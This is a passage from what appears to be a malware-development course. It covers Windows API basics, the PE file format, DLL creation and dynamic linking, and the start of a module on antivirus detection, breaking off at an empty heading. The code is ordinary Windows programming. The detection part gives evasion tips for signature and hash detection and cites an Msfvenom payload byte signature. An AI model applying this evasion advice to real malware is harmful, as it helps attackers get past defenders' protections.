The majority of Windows API functions have two versions ending with either "A" or with "W". For example, there is??[CreateFileA](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea)??and??[CreateFileW](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew). The functions ending with "A" are meant to indicate "ANSI" whereas the functions ending with "W" represent Unicode or "Wide".

The main difference to keep in mind is that the ANSI functions will take in ANSI data types as parameters, where applicable, whereas the Unicode functions will take in Unicode data types. For example, the first parameter for??`CreateFileA`??is an??`LPCSTR`, which is a pointer to a constant null-terminated string of??**8-bit**??Windows ANSI characters. On the other hand, the first parameter for??`CreateFileW`??is??`LPCWSTR`, a pointer to a constant null-terminated string of??**16-bit**??Unicode characters.

Furthermore, the number of required bytes will differ depending on which version is used.

`char str1[] = "maldev";`??// 7 bytes (maldev +??[null byte](https://www.tutorialandexample.com/null-character-in-c)).

`wchar str2[] = L"maldev";`??// 14 bytes, each character is 2 bytes (The null byte is also 2 bytes)

### In and Out Parameters

Windows APIs have??[in](https://learn.microsoft.com/en-us/windows/win32/midl/in)??and??[out](https://learn.microsoft.com/en-us/windows/win32/midl/out-idl)??parameters. An??`IN`??parameter is a parameter that is passed into a function and is used for input. Whereas an??`OUT`??parameter is a parameter used to return a value back to the caller of the function. Output parameters are often passed in by reference through pointers.

For example, the code snippet below shows a function??`HackTheWorld`??which takes in an integer pointer and sets the value to??`123`. This is considered an out parameter since the parameter is returning a value.

```c
BOOL HackTheWorld(OUT int* num){

    // Setting the value of num to 123
    *num = 123;
    
    // Returning a boolean value
    return TRUE;
}

int main(){
    int a = 0;

    // 'HackTheWorld' will return true
    // 'a' will contain the value 123
    HackTheWorld(&a);
}
```

Keep in mind that the use of the??`OUT`??or??`IN`??keywords is meant to make it easier for developers to understand what the function expects and what it does with these parameters. However, it is worth mentioning that excluding these keywords does not affect whether the parameter is considered an output or input parameter.

### Windows API Example

Now that the fundamentals of the Windows API have been laid out, this section will go through the usage of the??`CreateFileW`??function.

#### Find the API Reference

It's important to always reference the documentation if one is unsure about what the function does or what arguments it requires. Always read the description of the function and assess whether the function accomplishes the desired task. The??`CreateFileW`??documentation is available??[here](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew).

#### Analyze Return Type & Parameters

The next step would be to view the parameters of the function along with the return data type. The documentation states??_If the function succeeds, the return value is an open handle to the specified file, device, named pipe, or mail slot_??therefore??`CreateFileW`??returns a??`HANDLE`??data type to the specified item that's created.

Furthermore, notice that the function parameters are all??`in`??parameters. This means the function does not return any data from the parameters since they are all??`in`??parameters. Keep in mind that the keywords within the square brackets, such as??`in`,??`out`, and??`optional`, are purely for developers' reference and do not have any actual impact.

```c
HANDLE CreateFileW(
  [in]           LPCWSTR               lpFileName,
  [in]           DWORD                 dwDesiredAccess,
  [in]           DWORD                 dwShareMode,
  [in, optional] LPSECURITY_ATTRIBUTES lpSecurityAttributes,
  [in]           DWORD                 dwCreationDisposition,
  [in]           DWORD                 dwFlagsAndAttributes,
  [in, optional] HANDLE                hTemplateFile
);
```

#### Use The Function

The sample code below goes through an example usage of??`CreateFileW`. It will create a text file with the name??`maldev.txt`??on the current user's Desktop.

```c
// This is needed to store the handle to the file object
// the 'INVALID_HANDLE_VALUE' is just to intialize the variable
HANDLE hFile = INVALID_HANDLE_VALUE; 

// The full path of the file to create.
// Double backslashes are required to escape the single backslash character in C
// Make sure the username (maldevacademy) exists, otherwise modify it
LPCWSTR filePath = L"C:\\Users\\maldevacademy\\Desktop\\maldev.txt";

// Call CreateFileW with the file path
// The additional parameters are directly from the documentation
hFile = CreateFileW(filePath, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

// On failure CreateFileW returns INVALID_HANDLE_VALUE
// GetLastError() is another Windows API that retrieves the error code of the previously executed WinAPI function
if (hFile == INVALID_HANDLE_VALUE){
    printf("[-] CreateFileW Api Function Failed With Error : %d\n", GetLastError());
    return -1;
}
```

### Windows API Debugging Errors

When functions fail they often return a non-verbose error. For example, if??`CreateFileW`??fails it returns??`INVALID_HANDLE_VALUE`??which indicates that a file could not be created. To gain more insight as to why the file couldn't be created, the error code must be retrieved using the??[GetLastError](https://learn.microsoft.com/en-us/windows/win32/api/errhandlingapi/nf-errhandlingapi-getlasterror)??function.

Once the code is retrieved, it needs to be looked up in??[Windows's System Error Codes List](https://learn.microsoft.com/en-us/windows/win32/debug/system-error-codes--0-499-). Some common error codes are translated below:

- `5`??- ERROR_ACCESS_DENIED
    
- `2`??- ERROR_FILE_NOT_FOUND
    
- `87`??- ERROR_INVALID_PARAMETER
    

### Windows Native API Debugging Errors

Recall from the??_Windows Architecture_??module, NTAPIs are mostly exported from??`ntdll.dll`. Unlike Windows APIs, these functions cannot have their error code fetched via??`GetLastError`. Instead, they return the error code directly which is represented by the??`NTSTATUS`??data type.

`NTSTATUS`??is used to represent the status of a system call or function and is defined as a 32-bit unsigned integer value. A successful system call will return the value??`STATUS_SUCCESS`, which is??`0`. On the other hand, if the call failed it will return a non-zero value, to further investigate the cause of the problem, one must check??[Microsoft's documentation on NTSTATUS values](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-erref/596a1078-e883-4972-9bbc-49e60bebca55).

The code snippet below shows how error checking for system calls is done.

```c
NTSTATUS STATUS = NativeSyscallExample(...);
if (STATUS != STATUS_SUCCESS){
    // printing the error in unsigned integer hexadecimal format
    printf("[!] NativeSyscallExample Failed With Status : 0x%0.8X \n", STATUS); 
}

// NativeSyscallExample succeeded
```

#### NT_SUCCESS Macro

Another way to check the return value of NTAPIs is through the??`NT_SUCCESS`??macro shown??[here](https://learn.microsoft.com/en-us/windows-hardware/drivers/kernel/using-ntstatus-values). The macro returns??`TRUE`??if the function succeeded, and??`FALSE`??it fails.

```c
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
```

Below, is an example of using this macro

```c
NTSTATUS STATUS = NativeSyscallExample(...);
if (!NT_SUCCESS(STATUS)){
    // printing the error in unsigned integer hexadecimal format
    printf("[!] NativeSyscallExample Failed With Status : 0x%0.8X \n", STATUS); 
}

// NativeSyscallExample succeeded
```
# 1.6 Portable Executable Format

### Introduction

Portable Executable (PE) is the file format for executables on Windows. A few examples of PE file extensions are??`.exe`,??`.dll`,??`.sys`??and??`.scr`. This module discusses the PE structure which is important to know when building or reverse engineering malware.

Note that this module and future modules will often interchangeably refer to executables (e.g. EXEs, DLLs) as "Images".

### PE Structure

The diagram below shows a simplified structure of a Portable Executable. Every header shown in the image is defined as a data structure that holds information about the PE file. Each data structure will be explained in detail in this module.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/pe-structure.png)

  

#### DOS Header (IMAGE_DOS_HEADER)

This first header of a PE file is always prefixed with two bytes,??`0x4D`??and??`0x5A`, commonly referred to as??`MZ`. These bytes represent the DOS header signature, which is used to confirm that the file being parsed or inspected is a valid PE file. The DOS header is a data structure, defined as follows:

```c
typedef struct _IMAGE_DOS_HEADER {      // DOS .EXE header
    WORD   e_magic;                     // Magic number
    WORD   e_cblp;                      // Bytes on last page of file
    WORD   e_cp;                        // Pages in file
    WORD   e_crlc;                      // Relocations
    WORD   e_cparhdr;                   // Size of header in paragraphs
    WORD   e_minalloc;                  // Minimum extra paragraphs needed
    WORD   e_maxalloc;                  // Maximum extra paragraphs needed
    WORD   e_ss;                        // Initial (relative) SS value
    WORD   e_sp;                        // Initial SP value
    WORD   e_csum;                      // Checksum
    WORD   e_ip;                        // Initial IP value
    WORD   e_cs;                        // Initial (relative) CS value
    WORD   e_lfarlc;                    // File address of relocation table
    WORD   e_ovno;                      // Overlay number
    WORD   e_res[4];                    // Reserved words
    WORD   e_oemid;                     // OEM identifier (for e_oeminfo)
    WORD   e_oeminfo;                   // OEM information; e_oemid specific
    WORD   e_res2[10];                  // Reserved words
    LONG   e_lfanew;                    // Offset to the NT header
  } IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;
```

The most important members of the struct are??`e_magic`??and??`e_lfanew`.

`e_magic`??is 2 bytes with a fixed value of??`0x5A4D`??or??`MZ`.

`e_lfanew`??is a 4-byte value that holds an offset to the start of the NT Header. Note that??`e_lfanew`??is always located at an offset of??`0x3C`.

#### DOS Stub

Before moving on to the NT header structure, there is the DOS stub which is an error message that prints "This program cannot be run in DOS mode" in case the program is loaded in??[DOS mode](https://en.wikipedia.org/wiki/DOS)??or "Disk Operating Mode". It is worth noting that the error message can be changed by the programmer at compile time. This is not a PE header, but it's good to be aware of it.

#### NT Header (IMAGE_NT_HEADERS)

The NT header is essential as it incorporates two other image headers:??`FileHeader`??and??`OptionalHeader`, which include a large amount of information about the PE file. Similarly to the DOS header, the NT header contains a signature member that is used to verify it. Usually, the signature element is equal to the "PE" string, which is represented by the??`0x50`??and??`0x45`??bytes. But since the signature is of data type??`DWORD`, the signature will be represented as??`0x50450000`, which is still "PE", except that it is padded with two null bytes. The NT header can be reached using the??`e_lfanew`??member inside of the DOS Header.

The NT header structure varies depending on the machine's architecture.

**32-bit Version:**

```c
typedef struct _IMAGE_NT_HEADERS {
  DWORD                   Signature;
  IMAGE_FILE_HEADER       FileHeader;
  IMAGE_OPTIONAL_HEADER32 OptionalHeader;
} IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;
```

**64-bit Version:**

```c
typedef struct _IMAGE_NT_HEADERS64 {
    DWORD                   Signature;
    IMAGE_FILE_HEADER       FileHeader;
    IMAGE_OPTIONAL_HEADER64 OptionalHeader;
} IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64;
```

The only difference is the??`OptionalHeader`??data structure,??`IMAGE_OPTIONAL_HEADER32`??and??`IMAGE_OPTIONAL_HEADER64`.

#### File Header (IMAGE_FILE_HEADER)

Moving on to the next header, which can be accessed from the previous NT Header data structure

```c
typedef struct _IMAGE_FILE_HEADER {
  WORD  Machine;
  WORD  NumberOfSections;
  DWORD TimeDateStamp;
  DWORD PointerToSymbolTable;
  DWORD NumberOfSymbols;
  WORD  SizeOfOptionalHeader;
  WORD  Characteristics;
} IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;
```

The most important struct members are:

- `NumberOfSections`??- The number of sections in the PE file (discussed later).
    
- `Characteristics`??- Flags that specify certain attributes about the executable file, such as whether it is a dynamic-link library (DLL) or a console application.
    
- `SizeOfOptionalHeader`??- The size of the following optional header
    

Additional information about the file header can be found on the??[official documentation page](https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_file_header).

#### Optional Header (IMAGE_OPTIONAL_HEADER)

The optional header is important and although it's called "optional", it's essential for the execution of the PE file. It is referred to as optional because some file types do not have it.

The optional header has two versions, a version for 32-bit and 64-bit systems. Both versions have nearly identical members in their data structure with the main difference being the size of some members.??`ULONGLONG`??is used in the 64-bit version and??`DWORD`??in the 32-bit version. Additionally, the 32-bit version has some members which are not found in the 64-bit version.

**32-bit Version:**

```c
typedef struct _IMAGE_OPTIONAL_HEADER {
  WORD                 Magic;
  BYTE                 MajorLinkerVersion;
  BYTE                 MinorLinkerVersion;
  DWORD                SizeOfCode;
  DWORD                SizeOfInitializedData;
  DWORD                SizeOfUninitializedData;
  DWORD                AddressOfEntryPoint;
  DWORD                BaseOfCode;
  DWORD                BaseOfData;
  DWORD                ImageBase;
  DWORD                SectionAlignment;
  DWORD                FileAlignment;
  WORD                 MajorOperatingSystemVersion;
  WORD                 MinorOperatingSystemVersion;
  WORD                 MajorImageVersion;
  WORD                 MinorImageVersion;
  WORD                 MajorSubsystemVersion;
  WORD                 MinorSubsystemVersion;
  DWORD                Win32VersionValue;
  DWORD                SizeOfImage;
  DWORD                SizeOfHeaders;
  DWORD                CheckSum;
  WORD                 Subsystem;
  WORD                 DllCharacteristics;
  DWORD                SizeOfStackReserve;
  DWORD                SizeOfStackCommit;
  DWORD                SizeOfHeapReserve;
  DWORD                SizeOfHeapCommit;
  DWORD                LoaderFlags;
  DWORD                NumberOfRvaAndSizes;
  IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
} IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;
```

**64-bit Version:**

```c
typedef struct _IMAGE_OPTIONAL_HEADER64 {
  WORD                 Magic;
  BYTE                 MajorLinkerVersion;
  BYTE                 MinorLinkerVersion;
  DWORD                SizeOfCode;
  DWORD                SizeOfInitializedData;
  DWORD                SizeOfUninitializedData;
  DWORD                AddressOfEntryPoint;
  DWORD                BaseOfCode;
  ULONGLONG            ImageBase;
  DWORD                SectionAlignment;
  DWORD                FileAlignment;
  WORD                 MajorOperatingSystemVersion;
  WORD                 MinorOperatingSystemVersion;
  WORD                 MajorImageVersion;
  WORD                 MinorImageVersion;
  WORD                 MajorSubsystemVersion;
  WORD                 MinorSubsystemVersion;
  DWORD                Win32VersionValue;
  DWORD                SizeOfImage;
  DWORD                SizeOfHeaders;
  DWORD                CheckSum;
  WORD                 Subsystem;
  WORD                 DllCharacteristics;
  ULONGLONG            SizeOfStackReserve;
  ULONGLONG            SizeOfStackCommit;
  ULONGLONG            SizeOfHeapReserve;
  ULONGLONG            SizeOfHeapCommit;
  DWORD                LoaderFlags;
  DWORD                NumberOfRvaAndSizes;
  IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];
} IMAGE_OPTIONAL_HEADER64, *PIMAGE_OPTIONAL_HEADER64;
```

The optional header contains a ton of information that can be used. Below are some of the struct members that are commonly used:

- `Magic`??- Describes the state of the image file (32 or 64-bit image)
    
- `MajorOperatingSystemVersion`??- The major version number of the required operating system (e.g. 11, 10)
    
- `MinorOperatingSystemVersion`??- The minor version number of the required operating system (e.g. 1511, 1507, 1607)
    
- `SizeOfCode`??- The size of the??`.text`??section (Discussed later)
    
- `AddressOfEntryPoint`??- Offset to the entry point of the file (Typically the??_main_??function)
    
- `BaseOfCode`??- Offset to the start of the??`.text`??section
    
- `SizeOfImage`??- The size of the image file in bytes
    
- `ImageBase`??- It specifies the preferred address at which the application is to be loaded into memory when it is executed. However, due to Window's memory protection mechanisms like Address Space Layout Randomization (ASLR), it's rare to see an image mapped to its preferred address because the Windows PE Loader maps the file to a different address. This random allocation done by the Windows PE loader will cause issues in the implementation of future techniques because some addresses that are considered constant were changed. The Windows PE loader will then go through??_PE relocation_??to fix these addresses.
    
- `DataDirectory`??- One of the most important members in the optional header. This is an array of??[IMAGE_DATA_DIRECTORY](https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_data_directory), which contains the directories in a PE file (discussed below).
    

##### Data Directory

The Data Directory can be accessed from the optional's header last member. This is an array of data type??`IMAGE_DATA_DIRECTORY`??which has the following data structure:

```c
typedef struct _IMAGE_DATA_DIRECTORY {
    DWORD   VirtualAddress;
    DWORD   Size;
} IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;
```

The Data Directory array is of size??`IMAGE_NUMBEROF_DIRECTORY_ENTRIES`??which is a constant value of??`16`. Each element in the array represents a specific data directory which includes some data about a PE section or a Data Table (the place where specific information about the PE is saved).

A specific data directory can be accessed using its index in the array.

```c
#define IMAGE_DIRECTORY_ENTRY_EXPORT          0   // Export Directory
#define IMAGE_DIRECTORY_ENTRY_IMPORT          1   // Import Directory
#define IMAGE_DIRECTORY_ENTRY_RESOURCE        2   // Resource Directory
#define IMAGE_DIRECTORY_ENTRY_EXCEPTION       3   // Exception Directory
#define IMAGE_DIRECTORY_ENTRY_SECURITY        4   // Security Directory
#define IMAGE_DIRECTORY_ENTRY_BASERELOC       5   // Base Relocation Table
#define IMAGE_DIRECTORY_ENTRY_DEBUG           6   // Debug Directory
#define IMAGE_DIRECTORY_ENTRY_ARCHITECTURE    7   // Architecture Specific Data
#define IMAGE_DIRECTORY_ENTRY_GLOBALPTR       8   // RVA of GP
#define IMAGE_DIRECTORY_ENTRY_TLS             9   // TLS Directory
#define IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG    10   // Load Configuration Directory
#define IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT   11   // Bound Import Directory in headers
#define IMAGE_DIRECTORY_ENTRY_IAT            12   // Import Address Table
#define IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT   13   // Delay Load Import Descriptors
#define IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR 14   // COM Runtime descriptor
```

The two sections below will briefly mention two important data directories, the??`Export Directory`??and??`Import Address Table`.

##### Export Directory

A PE's export directory is a data structure that contains information about functions and variables that are exported from the executable. It contains the addresses of the exported functions and variables, which can be used by other executable files to access the functions and data. The export directory is generally found in DLLs that export functions (e.g.??`kernel32.dll`??exporting??`CreateFileA`).

##### Import Address Table

The import address table is a data structure in a PE that contains information about the addresses of functions imported from other executable files. The addresses are used to access the functions and data in the other executables (e.g.??`Application.exe`??importing??`CreateFileA`??from??`kernel32.dll`).

#### PE Sections

PE sections contain the code and data used to create an executable program. Each PE section is given a unique name and typically contains executable code, data, or resource information. There is no constant number of PE sections because different compilers can add, remove or merge sections depending on the configuration. Some sections can also be added later on manually, therefore it is dynamic and the??`IMAGE_FILE_HEADER.NumberOfSections`??helps determine that number.

The following PE sections are the most important ones and exist in almost every PE.

- `.text`??- Contains the executable code which is the written code.
    
- `.data`??- Contains initialized data which are variables initialized in the code.
    
- `.rdata`??- Contains read-only data. These are constant variables prefixed with??`const`.
    
- `.idata`??- Contains the import tables. These are tables of information related to the functions called using the code. This is used by the Windows PE Loader to determine which DLL files to load to the process, along with what functions are being used from each DLL.
    
- `.reloc`??- Contains information on how to fix up memory addresses so that the program can be loaded into memory without any errors.
    
- `.rsrc`??- Used to store resources such as icons and bitmaps
    

Each PE section has an??[IMAGE_SECTION_HEADER](https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_section_header)??data structure that contains valuable information about it. These structures are saved under the NT headers in a PE file and are stacked above each other where each structure represents a section.

Recall, the IMAGE_SECTION_HEADER structure is as follows:

```c
typedef struct _IMAGE_SECTION_HEADER {
  BYTE  Name[IMAGE_SIZEOF_SHORT_NAME];
  union {
    DWORD PhysicalAddress;
    DWORD VirtualSize;
  } Misc;
  DWORD VirtualAddress;
  DWORD SizeOfRawData;
  DWORD PointerToRawData;
  DWORD PointerToRelocations;
  DWORD PointerToLinenumbers;
  WORD  NumberOfRelocations;
  WORD  NumberOfLinenumbers;
  DWORD Characteristics;
} IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;
```

looking at the elements, every single one is highly valuable and important:

- `Name`??- The name of the section. (e.g. .text, .data, .rdata).
    
- `PhysicalAddress`??or??`VirtualSize`??- The size of the section when it is in memory.
    
- `VirtualAddress`??- Offset of the start of the section in memory.
    

### Additional References

In case further clarification is required on certain sections, the following blog posts on??[0xRick's Blog](https://0xrick.github.io/)??are highly recommended.

- PE Overview -??[https://0xrick.github.io/win-internals/pe2/](https://0xrick.github.io/win-internals/pe2/)
    
- DOS Header, DOS Stub and Rich Header -??[https://0xrick.github.io/win-internals/pe3/](https://0xrick.github.io/win-internals/pe3/)
    
- NT Headers -??[https://0xrick.github.io/win-internals/pe4/](https://0xrick.github.io/win-internals/pe4/)
    
- Data Directories, Section Headers and Sections -??[https://0xrick.github.io/win-internals/pe5/](https://0xrick.github.io/win-internals/pe5/)
    
- PE Imports (Import Directory Table, ILT, IAT) -??[https://0xrick.github.io/win-internals/pe6/](https://0xrick.github.io/win-internals/pe6/)
    

### Conclusion

Understanding PE headers might be challenging the first time they are encountered. Luckily, none of the basic modules require an in-depth understanding of the PE structure. However, to make the malware perform more complex techniques, it will require a better understanding as some of the code requires parsing the PE file's headers and sections. This will likely be seen in intermediate and advanced modules.
# 1.7 Dynamic-Link Library (DLL)

### Introduction

Both??`.exe`??and??`.dll`??file types are considered portable executable formats but there are differences between the two. This module explains the difference between the two file types.

### What is a DLL?

DLLs are shared libraries of executable functions or data that can be used by multiple applications simultaneously. They are used to export functions to be used by a process. Unlike EXE files, DLL files cannot execute code on their own. Instead, DLL libraries need to be invoked by other programs to execute the code. As previously mentioned, the??`CreateFileW`??is exported from??`kernel32.dll`, therefore if a process wants to call that function it would first need to load??`kernel32.dll`??into its address space.

Some DLLs are automatically loaded into every process by default since these DLLs export functions that are necessary for the process to execute properly. A few examples of these DLLs are??`ntdll.dll`,??`kernel32.dll`??and??`kernelbase.dll`. The image below shows several DLLs that are currently loaded by the??`explorer.exe`??process.

![Explorer-DLLs](https://maldevacademy.s3.amazonaws.com/images/Basic/8-dynamic-library-link/loaded-libraries.png)

### System-Wide DLL Base Address

The Windows OS uses a system-wide DLL base address to load some DLLs at the same base address in the virtual address space of all processes on a given machine to optimize memory usage and improve system performance. The following image shows??`kernel32.dll`??being loaded at the same address (`0x7fff9fad0000`) among multiple running processes.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/dll-new-221233432-97a38697-bd82-45f8-ad5f-90d674de8b17.png)

### Why Use DLLs?

There are several reasons why DLLs are very often used in Windows:

1. **Modularization of Code**??- Instead of having one massive executable that contains the entire functionality, the code is divided into several independent libraries with each library being focused on specific functionality. Modularization makes it easier for developers during development and debugging.

2. **Code Reuse**??- DLLs promote code reuse since a library can be invoked by multiple processes.

3. **Efficient Memory Usage**??- When several processes need the same DLL, they can save memory by sharing that DLL instead of loading it into the process's memory.


### DLL Entry Point

DLLs can optionally specify an entry point function that executes code when a certain task occurs such as when a process loads the DLL library. There are 4 possibilities for the entry point being called:

- `DLL_PROCESS_ATTACHED`??- A process is loading the DLL.

- `DLL_THREAD_ATTACHED`??- A process is creating a new thread.

- `DLL_THREAD_DETACH`??- A thread exits normally.

- `DLL_PROCESS_DETACH`??- A process unloads the DLL.


### Sample DLL Code

The code below shows a typical DLL code structure.

```c
BOOL APIENTRY DllMain(
    HANDLE hModule,             // Handle to DLL module
    DWORD ul_reason_for_call,   // Reason for calling function
    LPVOID lpReserved           // Reserved
) {
    
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACHED: // A process is loading the DLL.
        // Do something here
        break;
        case DLL_THREAD_ATTACHED: // A process is creating a new thread.
        // Do something here
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        // Do something here
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        // Do something here
        break;
    }
    return TRUE;
}
```

### Exporting a Function

DLLs can export functions that can then be used by the calling application or process. To export a function it needs to be defined using the keywords??`extern`??and??`__declspec(dllexport)`. An example exported function??`HelloWorld`??is shown below.

```c
////// sampleDLL.dll //////

extern __declspec(dllexport) void HelloWorld(){
// Function code here
}
```

### Dynamic Linking

It's possible to use the??`LoadLibrary`,??`GetModuleHandle`??and??`GetProcAddress`??WinAPIs to import a function from a DLL. This is referred to as??[dynamic linking](https://learn.microsoft.com/en-us/windows/win32/dlls/run-time-dynamic-linking). This is a method of loading and linking code (DLLs) at runtime rather than linking them at compile time using the linker and import address table.

There are several advantages of using dynamic linking, these are documented by Microsoft??[here](https://learn.microsoft.com/en-us/windows/win32/dlls/advantages-of-dynamic-linking).

This section walks through the steps of loading a DLL, retrieving the DLL's handle, retrieving the exported function's address and then invoking the function.

#### Loading a DLL

Calling a function such as??[MessageBoxA](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-messageboxa)??in an application will force the Windows OS to load the DLL exporting the??`MessageBoxA`??function into the calling process's memory address space, which in this case is??`user32.dll`. Loading??`user32.dll`??was done automatically by the OS when the process started and not by the code.

However, in some cases such as the??`HelloWorld`??function in??`sampleDLL.dll`, the DLL may not be loaded into memory. For the application to call the??`HelloWorld`??function, it first needs to retrieve the DLL's handle that is exporting the function. If the application doesn't have??`sampleDLL.dll`??loaded into memory, it would require the usage of the??[LoadLibrary](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya)??WinAPI, as shown below.

```c
HMODULE hModule = LoadLibraryA("sampleDLL.dll"); // hModule now contain sampleDLL.dll's handle
```

#### Retrieving a DLL's Handle

If??`sampleDLL.dll`??is already loaded into the application's memory, one can retrieve its handle via the??[GetModuleHandle](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea)??WinAPI function without leveraging the??`LoadLibrary`??function.

```c
HMODULE hModule = GetModuleHandleA("sampleDLL.dll");
```

#### Retrieving a Function's Address

Once the DLL is loaded into memory and the handle is retrieved, the next step is to retrieve the function's address. This is done using the??[GetProcAddress](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress)??WinAPI which takes the handle of the DLL that exports the function and the function name.

```c
PVOID pHelloWorld = GetProcAddress(hModule, "HelloWorld");
```

#### Invoking The Function

Once??`HelloWorld`'s address is saved into the??`pHelloWorld`??variable, the next step is to perform a type-cast on this address to??`HelloWorld`'s function pointer. This function pointer is required in order to invoke the function.

```c
// Constructing a new data type that represents HelloWorld's function pointer 
typedef void (WINAPI* HelloWorldFunctionPointer)();  

void call(){
    HMODULE hModule = LoadLibraryA("sampleDLL.dll");
    PVOID pHelloWorld = GetProcAddress(hModule, "HelloWorld");
    // Type-casting the 'pHelloWorld' variable to be of type 'HelloWorldFunctionPointer' 
    HelloWorldFunctionPointer HelloWorld = (HelloWorldFunctionPointer)pHelloWorld;
    HelloWorld();   // Calling the 'HelloWorld' function via its function pointer 
}
```

### Dynamic Linking Example

The code below demonstrates another simple example of dynamic linking where??`MessageBoxA`??is called. The code assumes that??`user32.dll`, the DLL that exports that function, isn't loaded into memory. Recall that if a DLL isn't loaded into memory the usage of??`LoadLibrary`??is required to load that DLL into the process's address space.

```c
typedef int (WINAPI* MessageBoxAFunctionPointer)( // Constructing a new data type, that will represent MessageBoxA's function pointer 
  HWND          hWnd,
  LPCSTR        lpText,
  LPCSTR        lpCaption,
  UINT          uType
);

void call(){
    // Retrieving MessageBox's address, and saving it to 'pMessageBoxA' (MessageBoxA's function pointer)
    MessageBoxAFunctionPointer pMessageBoxA = (MessageBoxAFunctionPointer)GetProcAddress(LoadLibraryA("user32.dll"), "MessageBoxA");
    if (pMessageBoxA != NULL){
        // Calling MessageBox via its function pointer if not null    
        pMessageBoxA(NULL, "MessageBox's Text", "MessageBox's Caption", MB_OK); 
    }
}
```

### Function Pointers

For the remainder of the course, the function pointer data types will have a naming convention that uses the WinAPI's name prefixed with??`fn`, which stands for "function pointer". For example, the above??`MessageBoxAFunctionPointer`??data type will be represented as??`fnMessageBoxA`. This is used to maintain simplicity and improve clarity throughout the course.

### Rundll32.exe

There are a couple of ways to run exported functions without using a programmatical method. One common technique is to use the??[rundll32.exe](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/rundll32)??binary.??`Rundll32.exe`??is a built-in Windows binary that is used to run an exported function of a DLL file. To run an exported function use the following command:

```c
rundll32.exe <dllname>, <function exported to run>
```

For example,??`User32.dll`??exports the function??`LockWorkStation`??which locks the machine. To run the function, use the following command:

```c
rundll32.exe user32.dll,LockWorkStation
```

### Creating a DLL File With Visual Studio

To create a DLL file, launch Visual studio and create a new project. When given the project templates, select the??`Dynamic-Link Library (DLL)`??option.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/create-dll-1.png)

  

Next, select the location where to save the project files. When that's done, the following C code should appear.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/create-dll-2.png)

  

The provided DLL template comes with??`framework.h`,??`pch.h`??and??`pch.cpp`??which are known as??[Precompiled Headers](https://en.wikipedia.org/wiki/Precompiled_header). These are files used to make the project compilation faster for large projects. It is unlikely that these will be required in this situation and therefore it is recommended to delete these files. To do so, highlight the file and press the delete key and select the 'Delete' option.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/create-dll-3-1.png)

  

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/create-dll-3.png)

  

After deleting the precompiled headers, the compiler's default settings must be changed to confirm that precompiled headers should not be used in the project.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/create-dll-4.png)

  

Go to??**C/C++ > Precompiled Header**

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/create-dll-5.png)

  

Change the 'Precompiled Header' option to 'Not Using Precompiled Headers' and press 'Apply'.

![image](https://maldevacademy.s3.amazonaws.com/images/Basic/create-dll-6.png)

  

Finally, change the??`dllmain.cpp`??file to??`dllmain.c`. This is required since the provided code snippets in Maldev Academy use C instead of C++. To compile the program, click Build > Build Solution and a DLL will be created under the??_Release_??or??_Debug_??folder, depending on the compile configuration.
# 1.8 Detection Mechanisms

### Introduction

Security solutions use several techniques to detect malicious software. It's important for one to understand what techniques security solutions use to detect or classify software as being malicious.

### Static/Signature Detection

A signature is a number of bytes or strings within a malware that uniquely identifies it. Other conditions can also be specified such as variable names and imported functions. Once the security solution scans a program, it attempts to match it to a list of known rules. These rules have to be pre-built and pushed to the security solution.??[YARA](https://virustotal.github.io/yara/)??is one tool that is used by security vendors to build detection rules. For example, if a shellcode contains a byte sequence that begins with??`FC 48 83 E4 F0 E8 C0 00 00 00 41 51 41 50 52 51`??then this can be used to detect that the payload is a Msfvenom's x64 exec payload. The same detection mechanism can be used against strings within the file.

Signature detection is easy to bypass but can be time-consuming. It's important to avoid hardcoding values in the malware that can be used to uniquely identify the implementation. The code that's presented throughout this course attempts to avoid hardcoding values that could be hardcoded and instead dynamically retrieves or calculates the values.

#### Hashing Detection

Hashing detection is a subset of static/signature detection. This is a very straightforward detection technique, and this is the fastest and simplest way a security solution can detect malware. This method is done by simply saving hashes (e.g. MD5, SHA256) about known malware in a database. The malware's file hash will be compared with the security solution's hash database to see if there's a positive match.

Evading hashing detection is extremely simple, although likely not enough on its own. By changing at least 1 byte in the file, the file hash will change for any hashing algorithm and therefore the file will have a file hash that is likely unique.

### Heuristic Detection

